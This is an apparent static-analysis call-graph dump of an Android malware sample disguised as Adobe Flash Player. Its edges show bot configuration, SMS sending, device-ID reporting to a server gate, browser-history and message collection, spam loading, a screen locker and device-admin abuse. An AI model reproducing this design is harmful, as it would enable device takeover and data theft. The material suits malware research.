VIRTUAL edge: $r36 = virtualinvoke r3.<java.io.File: java.io.File[] listFiles()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.io.File: java.io.File[] listFiles()>
SPECIAL edge: specialinvoke $r54.<com.adobe.flashplayer_.FlashVirtual: void <init>()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.FlashVirtual: void <init>()>
VIRTUAL edge: $r38 = virtualinvoke r0.<com.adobe.flashplayer_.AdobeUtil: android.content.Context getApplicationContext()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <android.content.ContextWrapper: android.content.Context getApplicationContext()>
VIRTUAL edge: virtualinvoke $r32.<com.adobe.flashplayer_.FlashVirtual: android.os.AsyncTask execute(java.lang.Object[])>($r24) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <android.os.AsyncTask: android.os.AsyncTask execute(java.lang.Object[])>
STATIC edge: $r24 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>("") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>("forceZ", "On", $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("_") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: r6 = staticinvoke <android.provider.Settings$Secure: java.lang.String getString(android.content.ContentResolver,java.lang.String)>($r13, "android_id") in <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <android.provider.Settings$Secure: java.lang.String getString(android.content.ContentResolver,java.lang.String)>
VIRTUAL edge: $r21 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke $r23.<com.adobe.flashplayer_.FlashVirtual: void <init>()>() in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashVirtual: void <init>()>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&c=") in <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
CLINIT edge: staticinvoke <android.app.Activity: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <android.app.Activity: void <clinit>()>
VIRTUAL edge: r4 = virtualinvoke $r19.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(":", "") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
SPECIAL edge: specialinvoke $r22.<java.lang.StringBuilder: void <init>(java.lang.String)>($r5) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r24) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r1.<android.view.View: void <init>(android.content.Context)>(null) in <dummyMainClass: com.adobe.flashplayer_.MacrosStat dummyMainMethod_com_adobe_flashplayer___MacrosStat(android.content.Intent)> ==> <android.view.View: void <init>(android.content.Context)>
SPECIAL edge: specialinvoke $r1.<java.lang.StringBuilder: void <init>(java.lang.String)>($r2) in <com.adobe.flashplayer_.MacrosStat: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r20 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke $r16.<com.adobe.flashplayer_.FlashVirtual: void <init>()>() in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashVirtual: void <init>()>
STATIC edge: r4 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r23) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>("EST:") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
STATIC edge: r25 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>(r25) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&e=") in <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r4.<java.io.InputStreamReader: void <init>(java.io.InputStream)>($r6) in <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.io.InputStreamReader: void <init>(java.io.InputStream)>
STATIC edge: $r3 = staticinvoke <android.telephony.SmsManager: android.telephony.SmsManager getDefault()>() in <com.adobe.flashplayer_.AdobeUtil: void sendSMS(java.lang.String,java.lang.String)> ==> <android.telephony.SmsManager: android.telephony.SmsManager getDefault()>
VIRTUAL edge: $i0 = virtualinvoke $r5.<java.lang.String: int indexOf(java.lang.String)>(",") in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: int indexOf(java.lang.String)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r9) in <com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: $r4 = specialinvoke r0.<com.adobe.flashplayer_.FlashY: java.lang.String readConfig(java.lang.String,android.content.Context)>("Reich_ServerGate", $r1) in <com.adobe.flashplayer_.FlashY: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashY: java.lang.String readConfig(java.lang.String,android.content.Context)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeFlashCore: void writeConfig(java.lang.String,java.lang.String)>("BotPhone", $r7) in <com.adobe.flashplayer_.AdobeFlashCore: void onCreate()> ==> <com.adobe.flashplayer_.AdobeFlashCore: void writeConfig(java.lang.String,java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r1) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke $r56.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("|") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("\r\r") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: r4 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r23) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke $r20.<java.lang.String: int indexOf(java.lang.String)>("a") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: int indexOf(java.lang.String)>
SPECIAL edge: specialinvoke r4.<java.lang.StringBuilder: void <init>()>() in <com.adobe.flashplayer_.AdobeFlashCore: java.lang.String readConfig(java.lang.String)> ==> <java.lang.StringBuilder: void <init>()>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>($r17, $r14, "browserHistory:Executed", $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: $r10 = virtualinvoke $r11.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(":", "") in <com.adobe.flashplayer_.FlashY: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
VIRTUAL edge: virtualinvoke r2.<android.content.Intent: android.content.Intent setFlags(int)>(268435456) in <com.adobe.flashplayer.Certificate$1: void onClick(android.view.View)> ==> <android.content.Intent: android.content.Intent setFlags(int)>
VIRTUAL edge: r5 = virtualinvoke $r56.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(".txt") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>("&b=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r21 = virtualinvoke $r19.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(":", "") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
STATIC edge: $r11 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>("") in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: $r16 = virtualinvoke $r22.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(".txt") in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: $r12 = specialinvoke r0.<com.adobe.flashplayer_.FlashY: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotLocation", $r1) in <com.adobe.flashplayer_.FlashY: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashY: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: $r24 = virtualinvoke r8.<java.lang.String: java.lang.String[] split(java.lang.String)>(",") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String[] split(java.lang.String)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>(r30) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: $r16 = specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)>("BotPhone") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)>
SPECIAL edge: $r16 = specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)>("BotLocation") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke r6.<java.lang.String: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String toString()>
SPECIAL edge: specialinvoke r0.<android.os.AsyncTask: void <init>()>() in <com.adobe.flashplayer_.FlashVars: void <init>()> ==> <android.os.AsyncTask: void <init>()>
VIRTUAL edge: virtualinvoke $r0.<com.adobe.flashplayer_.FlashARM: void onActivityResult(int,int,android.content.Intent)>(0, 0, null) in <dummyMainClass: com.adobe.flashplayer_.FlashARM dummyMainMethod_com_adobe_flashplayer___FlashARM(android.content.Intent)> ==> <com.adobe.flashplayer_.FlashARM: void onActivityResult(int,int,android.content.Intent)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("\r") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke $r0.<com.adobe.packages.ZLocker: void onAttachedToWindow()>() in <dummyMainClass: com.adobe.packages.ZLocker dummyMainMethod_com_adobe_packages_ZLocker(android.content.Intent)> ==> <com.adobe.packages.ZLocker: void onAttachedToWindow()>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r30) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r14.<java.lang.StringBuilder: void <init>(java.lang.String)>("a=2&b=") in <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke r4.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeFlashCore: java.lang.String readConfig(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke r0.<android.content.BroadcastReceiver: void <init>()>() in <com.adobe.flashplayer_.FlashW: void <init>()> ==> <android.content.BroadcastReceiver: void <init>()>
SPECIAL edge: specialinvoke $r0.<com.adobe.flashplayer_.FlashURL: void <init>()>() in <dummyMainClass: com.adobe.flashplayer_.FlashURL dummyMainMethod_com_adobe_flashplayer___FlashURL(android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void <init>()>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(" ") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: $r11 = specialinvoke r0.<com.adobe.flashplayer_.FlashW: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotPhone", $r1) in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashW: java.lang.String readConfig(java.lang.String,android.content.Context)>
SPECIAL edge: specialinvoke $r23.<com.adobe.flashplayer_.FlashVirtual: void <init>()>() in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashVirtual: void <init>()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: java.lang.String toString()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $r20 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&h=macros_a_good&i=macros_a_data") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r3.<java.io.BufferedReader: void <init>(java.io.Reader)>(r4) in <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.io.BufferedReader: void <init>(java.io.Reader)>
VIRTUAL edge: virtualinvoke r0.<com.adobe.flashplayer_.FlashURL: void sendSMS(java.lang.String,java.lang.String)>($r21, r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void sendSMS(java.lang.String,java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&c=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r17 = virtualinvoke $r17.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r6) in <com.adobe.flashplayer_.FlashY: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r22.<java.lang.StringBuilder: void <init>(java.lang.String)>("&b=") in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r16.<android.view.WindowManager$LayoutParams: void <init>(int,int,int,int,int)>($i0, $i1, 2003, 262144, $i2) in <com.adobe.flashplayer_.Prefs: void <init>(android.content.Context,java.lang.String)> ==> <android.view.WindowManager$LayoutParams: void <init>(int,int,int,int,int)>
VIRTUAL edge: r25 = virtualinvoke $r19.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(":", "") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
STATIC edge: $r35 = staticinvoke <android.os.Environment: java.io.File getExternalStorageDirectory()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <android.os.Environment: java.io.File getExternalStorageDirectory()>
VIRTUAL edge: r4 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("\r") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r28 = virtualinvoke $r26.<com.adobe.flashplayer_.FlashVars: android.os.AsyncTask execute(java.lang.Object[])>($r27) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <android.os.AsyncTask: android.os.AsyncTask execute(java.lang.Object[])>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r18) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $r44 = staticinvoke <java.lang.Integer: java.lang.Integer valueOf(int)>($i2) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.Integer: java.lang.Integer valueOf(int)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.FlashURL: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>("MacrosAState", "E", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: $i0 = virtualinvoke r8.<java.lang.String: int indexOf(java.lang.String)>("loadSpam") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: int indexOf(java.lang.String)>
VIRTUAL edge: $r25 = virtualinvoke $r21.<com.adobe.flashplayer_.FlashVars: android.os.AsyncTask execute(java.lang.Object[])>($r29) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <android.os.AsyncTask: android.os.AsyncTask execute(java.lang.Object[])>
STATIC edge: staticinvoke <dummyMainClass: com.adobe.flashplayer_.AdobeFlashCore dummyMainMethod_com_adobe_flashplayer___AdobeFlashCore(android.content.Intent)>(null) in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <dummyMainClass: com.adobe.flashplayer_.AdobeFlashCore dummyMainMethod_com_adobe_flashplayer___AdobeFlashCore(android.content.Intent)>
VIRTUAL edge: virtualinvoke r0.<com.adobe.flashplayer_.Prefs: void stopSelf()>() in <com.adobe.flashplayer_.Prefs: void <init>(android.content.Context,java.lang.String)> ==> <android.app.Service: void stopSelf()>
STATIC edge: $r20 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>("&b=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: virtualinvoke r4.<java.io.OutputStreamWriter: void write(java.lang.String)>($r2) in <com.adobe.flashplayer_.AdobeUtil: void writeConfig(java.lang.String,java.lang.String,android.content.Context)> ==> <java.io.Writer: void write(java.lang.String)>
SPECIAL edge: $r21 = specialinvoke r0.<com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotPhone", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: virtualinvoke r0.<com.adobe.flashplayer_.FlashARM: void startActivityForResult(android.content.Intent,int)>($r1, 1) in <com.adobe.flashplayer_.FlashARM: void onActivityResult(int,int,android.content.Intent)> ==> <android.app.Activity: void startActivityForResult(android.content.Intent,int)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>($r17, $r14, "getMessages:Executed:HTTP", $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>("&b=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: virtualinvoke $r16.<com.adobe.flashplayer_.FlashVirtual: android.os.AsyncTask execute(java.lang.Object[])>($r17) in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <android.os.AsyncTask: android.os.AsyncTask execute(java.lang.Object[])>
VIRTUAL edge: $r1 = virtualinvoke r0.<com.adobe.packages.ZLocker: android.view.Window getWindow()>() in <com.adobe.packages.ZLocker: void onAttachedToWindow()> ==> <android.app.Activity: android.view.Window getWindow()>
SPECIAL edge: $r20 = specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String,android.content.Context)>("Reich_SMSGate", $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("]:Executed:HTTP") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r24 = virtualinvoke r6.<java.lang.String: java.lang.String[] split(java.lang.String)>(" ") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String[] split(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r24) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.FlashURL: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>("spam_data", r4, $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>
SPECIAL edge: specialinvoke r0.<android.app.admin.DeviceAdminReceiver: void <init>()>() in <com.adobe.flashplayer_.ADOBEcoreZa: void <init>()> ==> <android.app.admin.DeviceAdminReceiver: void <init>()>
VIRTUAL edge: virtualinvoke r4.<java.io.OutputStreamWriter: void write(java.lang.String)>($r2) in <com.adobe.flashplayer_.FlashW: void writeConfig(java.lang.String,java.lang.String,android.content.Context)> ==> <java.io.Writer: void write(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke $r56.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r6) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $i2 = virtualinvoke $r20.<java.lang.String: int indexOf(java.lang.String)>("File") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: int indexOf(java.lang.String)>
VIRTUAL edge: r4 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $i1 = virtualinvoke $r5.<java.lang.String: int indexOf(java.lang.String)>($r11) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: int indexOf(java.lang.String)>
STATIC edge: r25 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>("") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
STATIC edge: r3 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r23) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&e=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r21 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r22 = virtualinvoke r19.<java.lang.String: java.lang.String[] split(java.lang.String)>(" ") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String[] split(java.lang.String)>
SPECIAL edge: $r20 = specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)>("BotPhone") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)>
VIRTUAL edge: virtualinvoke $r3.<com.adobe.flashplayer_.MacrosStat$1: android.os.CountDownTimer start()>() in <com.adobe.flashplayer_.MacrosStat: void onCreate()> ==> <android.os.CountDownTimer: android.os.CountDownTimer start()>
SPECIAL edge: specialinvoke $r22.<java.lang.StringBuilder: void <init>(java.lang.String)>($r17) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
